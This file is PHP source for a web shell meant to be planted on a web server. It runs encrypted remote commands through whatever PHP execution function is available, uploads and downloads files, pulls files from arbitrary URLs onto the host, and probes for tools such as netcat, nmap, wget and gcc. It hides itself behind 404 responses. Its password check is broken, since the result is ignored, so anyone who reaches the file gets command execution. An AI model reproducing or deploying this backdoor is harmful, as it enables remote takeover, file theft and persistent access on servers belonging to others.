<?php
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// This script should be run via HTTP only
if (php_sapi_name() === 'cli') {
    exit(-1);
}

$key = '[KEY_HERE]';
$iv = '[IV_HERE]';
$login = '[LOGIN_HERE]';
$password = '[PASSWORD_HERE]';

header("Content-type: plain/text");
header("Pragma: no-cache");
header("Expires: 0");
header_remove("X-Powered-By");

// Basic Auth is required
require_auth($login, $password);

// Internal actions
if (isset($_POST['i'])) {
    $action = base64_decode($_POST['i']);
    if ($action == 'ping') {
        header("HTTP/1.1 200 OK");

        $owner = '';
        if(is_function_available('posix_getpwuid')){
            $owner_uid = posix_getpwuid(posix_geteuid());
            $owner = $owner_uid['name'];
        } else {
            $owner = getenv('USERNAME');
        }

        $output = json_encode(array(
            'user' => base64_encode($owner),
            'path' => base64_encode(getcwd()),
            'hostname' => base64_encode(gethostname()),
            'php' => base64_encode(phpversion()),
            'os' => base64_encode(php_uname()),
            'server' => base64_encode($_SERVER['SERVER_SOFTWARE']),
            'time' => base64_encode(date('l jS F Y h:i:s A')),
            'ip' => base64_encode(getenv('SERVER_ADDR')),
            'client_ip' => base64_encode(get_client_ip()),
            'tools' => base64_encode(implode('|', find_tools()))
        ));
        echo encrypt_decrypt('encrypt', $output, $key, $iv);
    }

    exit(0);
}

// Return 404 if we don't receive the action
if (!isset($_POST['c']) && !isset($_POST['f'])) {
    header("HTTP/1.1 404 Not Found");
    header_remove("Content-type");
    exit(-1);
}

$output = '';
$downloads = array();

$path = realpath(base64_decode($_POST['p']));
if(isset($_POST['c'])){
    // Receiving the command
    $cmd = base64_decode(encrypt_decrypt('decrypt', $_POST['c'], $key, $iv));

    // If we receive a `cd` command, we need to move ...
    if (substr($cmd, 0, 3) == 'cd ') {
        $dir = substr($cmd, 3);
        if ($dir == '~/') {
            $user = posix_getpwuid(posix_getuid());
            $dir = $user['dir'];
        }
        $dir = realpath($dir);
        chdir($dir);
    } else {
        // Let's run the action
        if (strlen($cmd) > 0) {
            chdir($path);
            $output = execute_command($cmd);
        }
    }
}

if(isset($_POST['f'])) {
    $files = $_POST['f'];
    if (isset($files['d'])) {
        foreach ($files['d'] as $file) {
            $name = base64_decode(encrypt_decrypt('decrypt', $file, $key, $iv));
            $payload = file_to_base64($name);
            array_push($downloads, array('name' => $name, 'content' => $payload));
        }
    }
    if (isset($files['u'])){
        foreach ($files['u'] as $encrypted_url){
            $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['n'], $key, $iv));
            $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['p'], $key, $iv));
            $result = download_file_from_url($payload, $path, $name);
            if(is_null($result)){
                $output .= "Permission denied {$path}/{$name}\n";
            } elseif ($result == false){
                $output .= "Unable to download the file\n";
            } else {
                $output .= $result . "\n";
            }
        }
    }
    if (isset($files['b'])) {
        foreach ($files['b'] as $encrypted_binary) {
            $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['n'], $key, $iv));
            $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['p'], $key, $iv));
            $result = base64_to_file($payload, $path, $name);
            if (is_null($result)) {
                $output .= "Permission denied {$path}/{$name}\n";
            } else {
                $output .= $result . "\n";
            }
        }
    }
}

// Now, we need to return an encrypted json
exit(encrypt_decrypt('encrypt', json_encode(array(
    'output' => base64_encode($output),
    'path' => base64_encode(getcwd()),
    'files' => $downloads
)), $key, $iv));

/*------------------*/
/*- Core Functions -*/
/*------------------*/

// Validate the Basic Auth
function require_auth($login, $password)
{
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
    $is_not_authenticated = (
        !$has_supplied_credentials ||
        $_SERVER['PHP_AUTH_USER'] != $login ||
        $_SERVER['PHP_AUTH_PW']   != $password
    );

    return $is_not_authenticated;
}

// Really basic function to encrypt and decrypt
function encrypt_decrypt($action, $string, $secret_key, $secret_iv)
{
    $output = false;
    $encrypt_method = "AES-256-CBC";
    $key = hash('sha256', $secret_key);
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    if ($action == 'encrypt') {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } else
        if ($action == 'decrypt') {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
        }

    return $output;
}

// Let's try to find our shell
function get_shell_command()
{
    $shell_command = null;
    if ($shell_command === null) {
        if (is_function_available('system')) {
            $shell_command = 'system';
        } elseif (is_function_available('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_function_available('exec')) {
            $shell_command = 'exec';
        } elseif (is_function_available('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_function_available('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_function_available('popen')) {
            $shell_command = 'popen';
        }
    }

    return $shell_command;
}

// Run, baby!
function execute_command($command)
{
    $command .= ' 2>&1';
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;
        case 'shell_exec':
            return @shell_exec($command);
        case 'exec':
            @exec($command, $outputArr, $code);
            return implode(PHP_EOL, $outputArr);
        case 'passthru':
            ob_start();
            @passthru($command, $code);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;
        case 'proc_open':
            $descriptors = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            $process = proc_open($command, $descriptors, $pipes, getcwd());
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $code = proc_close($process);
            return $output;
        case 'popen':
            $process = popen($command, 'r');
            $output = fread($process, 4096);
            pclose($process);
            return $output;
        default:
            return 'None available function to run your command, sorry. :(';
    }
}

// Getting the disabled functions
function disabled_functions()
{
    static $disabled_fn;
    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}

// Whether or not a function is available
function is_function_available($function)
{
    return is_callable($function) && !in_array($function, disabled_functions());
}

// Let's try to find the real client IP
function get_client_ip()
{
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Find some tools
function find_tools(){
    $found = array();
    $tools = array('python','perl','ruby','nc','netcat','ncat','gcc','nmap','wget','curl');

    $command = null;

    switch (true) {
        case stristr(PHP_OS, 'DAR'): $command = 'which'; break;
        case stristr(PHP_OS, 'WIN'): $command = 'where'; break;
        case stristr(PHP_OS, 'LINUX'): $command = 'which'; break;
        default: $command = '';
    }

    if (!empty($command)) {
        foreach ($tools as $tool) {
            $output = execute_command("{$command} {$tool}");
            if (strlen(trim($output)) > 0) {
                array_push($found, $tool);
            }
        }
    }

    return $found;
}

// Create file from base64
function base64_to_file($base64_string, $path, $output_file)
{
    if(!is_writable($path)){
        return null;
    }
    $complete_path = $path . '/'. $output_file;
    $handle = fopen($complete_path, "wb");
    fwrite($handle, base64_decode($base64_string));
    fclose($handle);
    return $output_file;
}

// Read file to Base64
function file_to_base64($file)
{
    if(file_exists($file) && is_readable($file)){
        return base64_encode(file_get_contents($file));
    }
    return null;
}

// Download file from URL
function download_file_from_url($url, $path, $output_file)
{
    if(!is_writable($path)){
        return null;
    }
    $complete_path = $path . '/'. $output_file;
    $options = array(
        CURLOPT_FILE => is_resource($complete_path) ? $complete_path : fopen($complete_path, 'w'),
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_URL => $url,
        CURLOPT_FAILONERROR => true,
    );

    $ch = curl_init();
    curl_setopt_array($ch, $options);
    $return = curl_exec($ch);

    if ($return === false) {
        return false;
    }
    return $output_file;
}
/* EOF */
